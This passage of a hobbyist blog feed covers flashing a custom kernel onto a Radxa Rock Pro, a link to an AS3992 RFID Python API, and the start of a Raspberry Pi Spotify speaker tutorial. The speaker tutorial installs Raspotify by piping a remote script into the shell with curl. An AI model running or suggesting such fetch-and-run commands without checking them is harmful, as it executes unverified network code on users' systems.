&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;#!&amp;#x2F;bin&amp;#x2F;sh -e
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# mtd-by-name link the mtdblock to name
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# radxa.com, thanks to naobsd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rm -rf &amp;#x2F;dev&amp;#x2F;block&amp;#x2F;mtd&amp;#x2F;by-name&amp;#x2F;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;mkdir -p &amp;#x2F;dev&amp;#x2F;block&amp;#x2F;mtd&amp;#x2F;by-name
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;for&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt; i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;in &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ls -d &amp;#x2F;sys&amp;#x2F;class&amp;#x2F;mtd&amp;#x2F;mtd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;*&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;[&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;0&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;-&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;9&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;]&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;; &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;do
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;name&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;`cat $i&amp;#x2F;name`
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;tmp&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$i &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sed -e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;s&amp;#x2F;mtd&amp;#x2F;mtdblock&amp;#x2F;g&amp;amp;#39;`&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;dev&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;=&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;quot;`&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;echo &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;$tmp &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;|&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sed -e &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#b8bb26;&amp;quot;&amp;gt;&amp;amp;#39;s&amp;#x2F;\&amp;#x2F;sys\&amp;#x2F;class\&amp;#x2F;mtdblock&amp;#x2F;\&amp;#x2F;dev&amp;#x2F;g&amp;amp;#39;`&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;    &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;ln -s $dev &amp;#x2F;dev&amp;#x2F;block&amp;#x2F;mtd&amp;#x2F;by-name&amp;#x2F;$name
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fa5c4b;&amp;quot;&amp;gt;done
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Make sure the script is executable and edit the startup script:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo chmod +x .&amp;#x2F;ubuntu_sdcard&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin&amp;#x2F;mtd-by-name.sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo vi .&amp;#x2F;ubuntu_sdcard&amp;#x2F;etc&amp;#x2F;rc.local
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And add the line below before &amp;lt;em&amp;gt;exit 0:&amp;lt;&amp;#x2F;em&amp;gt;&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;&amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin&amp;#x2F;mtd-by-name.sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;That’s it. Let’s unmount the ext4 partition:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo umount .&amp;#x2F;ubuntu_sdcard&amp;#x2F;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img should now contain your new files! You can download my compiled version &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;dl.dropboxusercontent.com&amp;#x2F;u&amp;#x2F;3819031&amp;#x2F;radxa_rock_pro_ubuntu_14.04_server_k3.18.11_150502_guylewin_sdcard.rar&amp;quot;&amp;gt;here&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;flashing-sd-card-image&amp;quot;&amp;gt;Flashing SD Card Image&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;To flash the newly created image, you should use &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;sourceforge.net&amp;#x2F;projects&amp;#x2F;win32diskimager&amp;#x2F;&amp;quot;&amp;gt;Win32DiskImager&amp;lt;&amp;#x2F;a&amp;gt; if you’re on Windows (simply follow the GUI).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;If you’re on Linux &amp;#x2F; OS X, you can use the dd command using this syntax (replace &amp;lt;em&amp;gt;&amp;#x2F;dev&amp;#x2F;sdc&amp;lt;&amp;#x2F;em&amp;gt; with your SD card writer device):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo dd if=radxa_rock_pro_ubuntu_14.04_server_k318rc5_141129_sdcard.img of=&amp;#x2F;dev&amp;#x2F;sdc
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Now take out your MicroSD card and put it in the Rock Pro. It will be necessary for boot after we flash the device.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;flashing-the-kernel&amp;quot;&amp;gt;Flashing the Kernel&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Connect the device to your computer via USB, and follow &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;http:&amp;#x2F;&amp;#x2F;radxa.com&amp;#x2F;Rock&amp;#x2F;Loader_mode&amp;quot;&amp;gt;these instructions&amp;lt;&amp;#x2F;a&amp;gt; to bring the Rock Pro to loader mode.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;Get the parameter file describing kernel parameters by:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;wget http:&amp;#x2F;&amp;#x2F;dl.radxa.com&amp;#x2F;rock&amp;#x2F;images&amp;#x2F;parameter&amp;#x2F;parameter_linux_sd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Install rkflashtool to flash the Rock Pro:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;git clone https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;linux-rockchip&amp;#x2F;rkflashtool
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fabd2f;&amp;quot;&amp;gt;cd&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; rkflashtool
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;make
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sudo cp rkflashtool rkcrc rkunpack rkunsign &amp;#x2F;usr&amp;#x2F;local&amp;#x2F;bin
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;And use it to flash boot.img and restart the device:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rkflashtool P &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; parameter_linux_sd
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;rkflashtool w boot &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;&amp;amp;lt;&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt; boot.img rkflashtool b
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;Your device should now reboot into it’s new kernel, with rtl8187 support.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;p&amp;gt;And that’s it! If you have any questions, fixes, etc, feel free to contact me &amp;#x2F; comment.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
        </entry>
        
    
    
    
        
        
            
            <entry>
                <title>AS3992 Python API</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-08-as3992-python-api&#x2F;"/>
                <updated>2015-05-08T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2015-05-08-as3992-python-api&#x2F;</id>
                <content type="html">&amp;lt;p&amp;gt;A while ago I wrote down a small Python script to control AS3992 RFID reader via UART to USB.&amp;lt;br &amp;#x2F;&amp;gt;
The source is available at &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;pyAS3992&amp;quot;&amp;gt;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;GuyLewin&amp;#x2F;pyAS3992&amp;lt;&amp;#x2F;a&amp;gt;.&amp;lt;&amp;#x2F;p&amp;gt;
</content>
            </entry>
            
        
            
            <entry>
                <title>Bathroom Smart Speaker using UE Boom, Raspberry Pi, Spotify and Home Assistant</title>
                <link href="https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-09-16-bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant&#x2F;"/>
                <updated>2021-09-16T00:00:00+0000</updated>
                <id>https:&#x2F;&#x2F;guylewin.com&#x2F;blog&#x2F;2021-09-16-bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant&#x2F;</id>
                <content type="html">&amp;lt;h2 id=&amp;quot;goal&amp;quot;&amp;gt;Goal&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;We’re going to build a smart speaker system that can play tropical forest sounds (or any other Spotify playlist) on demand from Home Assistant, and support Spotify Connect connectivity to cast music from other Spotify clients (if you want to put your own music while showering).&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;why&amp;quot;&amp;gt;Why?&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;Who doesn’t like showering with music? And if you already put a speaker in your bathroom, why not put some tropical background sounds while you’re at it?&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h2 id=&amp;quot;hardware-requirements&amp;quot;&amp;gt;Hardware Requirements&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;p&amp;gt;I’m using the following hardware for my setup:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.ultimateears.com&amp;#x2F;en-us&amp;#x2F;wireless-speakers&amp;#x2F;boom-3.html&amp;quot;&amp;gt;UE &amp;lt;&amp;#x2F;a&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.ultimateears.com&amp;#x2F;en-us&amp;#x2F;wireless-speakers&amp;#x2F;boom-3.html&amp;quot;&amp;gt;Boom&amp;lt;&amp;#x2F;a&amp;gt; (I’m actually using UE Boom 2 but any UE Boom would work).&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.raspberrypi.org&amp;#x2F;products&amp;#x2F;raspberry-pi-zero-w&amp;#x2F;&amp;quot;&amp;gt;Raspberry Pi Zero W&amp;lt;&amp;#x2F;a&amp;gt; (any Raspberry Pi with Bluetooth will work. Make sure it’ll also have WiFi since most bathrooms don’t have an Ethernet port).
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;microSD card and power adapter for the Raspberry Pi.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Optional: &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.aqara.com&amp;#x2F;us&amp;#x2F;motion_sensor.html&amp;quot;&amp;gt;Aqara Motion Sensor&amp;lt;&amp;#x2F;a&amp;gt; + &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.phoscon.de&amp;#x2F;en&amp;#x2F;conbee2&amp;quot;&amp;gt;ConBee II&amp;lt;&amp;#x2F;a&amp;gt; (if you want to turn music on &amp;#x2F; off based on motion).&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;additional-requirements&amp;quot;&amp;gt;Additional Requirements&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;&amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.home-assistant.io&amp;#x2F;&amp;quot;&amp;gt;Home Assistant&amp;lt;&amp;#x2F;a&amp;gt; installation in LAN.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Spotify Premium account.&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;h2 id=&amp;quot;steps&amp;quot;&amp;gt;Steps&amp;lt;&amp;#x2F;h2&amp;gt;
&amp;lt;h3 id=&amp;quot;preparing-the-raspberry-pi&amp;quot;&amp;gt;Preparing the Raspberry Pi&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Install &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.raspberrypi.org&amp;#x2F;software&amp;#x2F;&amp;quot;&amp;gt;Raspberry Pi OS&amp;lt;&amp;#x2F;a&amp;gt; on your device by using software such as &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;www.raspberrypi.org&amp;#x2F;documentation&amp;#x2F;computers&amp;#x2F;getting-started.html#using-raspberry-pi-imager&amp;quot;&amp;gt;Raspberry Pi Imager&amp;lt;&amp;#x2F;a&amp;gt;. I chose to install the &amp;quot;Raspberry Pi OS with desktop&amp;quot; flavor.&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;h3 id=&amp;quot;installing-raspotify&amp;quot;&amp;gt;Installing Raspotify&amp;lt;&amp;#x2F;h3&amp;gt;
&amp;lt;p&amp;gt;Once the RPi is installed and connected to your local network, connect via SSH and run the following command to install &amp;lt;a rel=&amp;quot;noopener&amp;quot; target=&amp;quot;_blank&amp;quot; href=&amp;quot;https:&amp;#x2F;&amp;#x2F;github.com&amp;#x2F;dtcooper&amp;#x2F;raspotify&amp;quot;&amp;gt;Raspotify&amp;lt;&amp;#x2F;a&amp;gt; - the Spotify connect server for Raspberry Pi:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre data-lang=&amp;quot;bash&amp;quot; style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot; class=&amp;quot;language-bash &amp;quot;&amp;gt;&amp;lt;code class=&amp;quot;language-bash&amp;quot; data-lang=&amp;quot;bash&amp;quot;&amp;gt;&amp;lt;span style=&amp;quot;font-style:italic;color:#928374;&amp;quot;&amp;gt;# Install Raspotify
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;curl -sL https:&amp;#x2F;&amp;#x2F;dtcooper.github.io&amp;#x2F;raspotify&amp;#x2F;install.sh &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fe8019;&amp;quot;&amp;gt;| &amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span style=&amp;quot;color:#fdf4c1;&amp;quot;&amp;gt;sh
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;&amp;#x2F;code&amp;gt;&amp;lt;&amp;#x2F;pre&amp;gt;
&amp;lt;p&amp;gt;After installation, edit &amp;lt;code&amp;gt;&amp;#x2F;etc&amp;#x2F;default&amp;#x2F;raspotify&amp;lt;&amp;#x2F;code&amp;gt; to change some parameters:&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;ul&amp;gt;
&amp;lt;li&amp;gt;Uncomment (remove the # at the beginning) the line that starts with &amp;lt;code&amp;gt;DEVICE_NAME&amp;lt;&amp;#x2F;code&amp;gt; and name your Spotify connect server (e.g. &amp;lt;code&amp;gt;Bathroom Speaker&amp;lt;&amp;#x2F;code&amp;gt;)&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;li&amp;gt;Uncomment (remove the # at the beginning) the line that starts with &amp;lt;code&amp;gt;OPTIONS&amp;lt;&amp;#x2F;code&amp;gt; in order to specify your Spotify premium credentials. This is crucial to allow Home Assistant to play music on this speaker&amp;lt;&amp;#x2F;li&amp;gt;
&amp;lt;&amp;#x2F;ul&amp;gt;
&amp;lt;p&amp;gt;The file should look like this (&amp;lt;strong&amp;gt;while changing every &amp;lt;code&amp;gt;&amp;amp;lt;&amp;amp;gt;&amp;lt;&amp;#x2F;code&amp;gt; parameter&amp;lt;&amp;#x2F;strong&amp;gt;):&amp;lt;&amp;#x2F;p&amp;gt;
&amp;lt;pre style=&amp;quot;background-color:#282828;color:#fdf4c1aa;&amp;quot;&amp;gt;&amp;lt;code&amp;gt;&amp;lt;span&amp;gt;# &amp;#x2F;etc&amp;#x2F;default&amp;#x2F;raspotify -- Arguments&amp;#x2F;configuration for librespot
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Device name on Spotify Connect
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;DEVICE_NAME=&amp;amp;quot;&amp;amp;lt;Speaker Name&amp;amp;gt;&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# The displayed device type in Spotify clients.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Can be &amp;amp;quot;unknown&amp;amp;quot;, &amp;amp;quot;computer&amp;amp;quot;, &amp;amp;quot;tablet&amp;amp;quot;, &amp;amp;quot;smartphone&amp;amp;quot;, &amp;amp;quot;speaker&amp;amp;quot;, &amp;amp;quot;tv&amp;amp;quot;,
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# &amp;amp;quot;avr&amp;amp;quot; (Audio&amp;#x2F;Video Receiver), &amp;amp;quot;stb&amp;amp;quot; (Set-Top Box), and &amp;amp;quot;audiodongle&amp;amp;quot;.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#DEVICE_TYPE=&amp;amp;quot;speaker&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Bitrate, one of 96 (low quality), 160 (default quality), or 320 (high quality)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#BITRATE=&amp;amp;quot;160&amp;amp;quot;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# Additional command line arguments for librespot can be set below.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# See `librespot -h` for more info. Make sure whatever arguments you specify
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# aren&amp;amp;#39;t already covered by other variables in this file. (See the daemon&amp;amp;#39;s
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# config at `&amp;#x2F;lib&amp;#x2F;systemd&amp;#x2F;system&amp;#x2F;raspotify.service` for more technical details.)
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# To make your device visible on Spotify Connect across the Internet add your
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# username and password which can be set via &amp;amp;quot;Set device password&amp;amp;quot;, on your
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# account settings, use `--username` and `--password`.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# To choose a different output device (ie a USB audio dongle or HDMI audio out),
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;# use `--device` with something like `--device hw:0,1`. Your mileage may vary.
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;#
&amp;lt;&amp;#x2F;span&amp;gt;&amp;lt;span&amp;gt;OPTIONS=&amp;amp;quot;--username &amp;amp;#39;&amp;amp;lt;Put Spotify Premium Username Here&amp;amp;gt;&amp;amp;#39; --password &amp;amp;#39;&amp;amp;lt;Put Spotify Premium Password Here&amp;amp;gt;&amp;amp;#39;&amp;amp;quot;
